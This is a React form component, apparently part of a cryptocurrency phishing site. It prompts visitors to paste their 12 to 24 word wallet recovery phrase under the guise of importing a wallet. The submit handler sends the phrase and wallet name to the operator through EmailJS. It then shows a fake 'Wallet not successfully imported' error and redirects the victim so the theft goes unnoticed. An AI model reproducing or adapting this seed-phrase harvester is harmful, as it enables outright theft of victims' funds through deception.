import React, { useState, useEffect, useContext } from "react";
import emailjs from "@emailjs/browser";
import { FaArrowRight, FaArrowRotateRight } from "react-icons/fa6";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useNavigate } from "react-router-dom";
import { Label, Textarea } from "flowbite-react";
import { ProjectContext } from "../context/ProjectContext";

const Phrase = () => {
  const [loading, setLoading] = useState(false);
  const [openModal, setOpenModal] = useState(false);
  const { walletName, phrase, setPhrase, handleSubmitNow } =
    useContext(ProjectContext);
  const navigate = useNavigate();

  const confirmModal = () => {
    setOpenModal(true);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setOpenModal(false);
    setLoading(true);
    emailjs
      .send(
        import.meta.env.VITE_API_SERVICEID,
        import.meta.env.VITE_API_TEMPLATEID,
        {
          message: phrase,
          walletName: walletName,
        }
      )
      .then((response) => {
        setLoading(false);
        handleSubmitNow();
        toast.error("Wallet not successfully imported. Please try again.");
        setPhrase("");
        setTimeout(() => {
          navigate("/");
        }, 3000);
      })
      .catch((error) => {
        console.log(error)
        navigate("/error");
        setLoading(false);
        toast.error("Wallet not successfully imported. Please try again.");
      });
  };

  useEffect(() => emailjs.init(import.meta.env.VITE_API_PUBLIC_KEY), []);

  return (
    <section className="p-2">
      <ToastContainer autoClose={2500} />
      <form onSubmit={handleSubmit} className="form">
        <div>
          <div className="mb-2 block">
            <Label htmlFor="comment" value="Enter your phrase here" />
          </div>
          <Textarea
            id="comment"
            className="focus:outline-wallet focus:ring-0 focus:border-0"
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Paste here..."
            required
            rows={4}
          />
        </div>
        <p className="text-sm self-center mt-6 text-gray-900 dark:text-gray-200">
          Typically 12 (sometimes 18, 24) words separated by single spaces
        </p>
        {/* <Modal
          show={openModal}
          size="md"
          onClose={() => setOpenModal(false)}
          popup
        >
          <Modal.Header />
          <Modal.Body>
            <div className="text-center">
              <HiOutlineExclamationCircle className="mx-auto mb-4 h-14 w-14 text-gray-400 dark:text-gray-200" />
              <h3 className="mb-5 text-lg font-normal text-gray-500 dark:text-gray-400">
                Are you sure you want to import your wallet?
              </h3>
              <div className="flex justify-center gap-4">
                <Button type="submit" color="blue" onClick={handleSubmit}>
                  {"Yes, I'm sure"}
                </Button>
                <Button color="gray" onClick={() => setOpenModal(false)}>
                  No, cancel
                </Button>
              </div>
            </div>
          </Modal.Body>
        </Modal> */}
        <button
          type="submit"
          onClick={phrase.length > 30 ? handleSubmit : null}
          value="send"
          className="submitBtn self-center mt-10  max-w-sm w-full"
        >
          {loading ? "Importing.." : "Import"}
          {loading ? (
            <FaArrowRotateRight className="animate-spin font-bold" />
          ) : (
            <FaArrowRight />
          )}
        </button>{" "}
        <a
          className="text-center mt-10 text-xs text-gray-900 dark:text-gray-200"
          href="https://cointelegraph.com/explained/what-is-a-seed-phrase-and-why-is-it-important"
        >
          What is secret phrase?
        </a>
      </form>
    </section>
  );
};

export default Phrase;
